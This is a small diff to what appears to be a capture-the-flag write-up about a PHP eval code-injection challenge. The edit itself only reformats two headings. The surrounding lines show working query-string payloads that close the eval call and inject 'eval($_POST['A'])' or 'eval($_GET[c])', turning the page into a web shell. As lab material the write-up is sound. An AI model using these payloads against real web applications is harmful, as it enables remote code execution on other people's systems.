@@ -9,7 +9,7 @@ eval("var_dump($a);");
 ```
 
 # Solution
-payload1:
+## payload1
 ```
 ?hello=);eval($_POST['A']);%2f%2f
 
@@ -27,7 +27,7 @@ string(22) ");eval($_POST['A']);//"
 eval("string(21) ");eval($_GET['A']);//"");
 ```
 
-payload2:
+## payload2
 ```
 ?hello=);eval($_GET[c]&c=phpinfo();
 ```
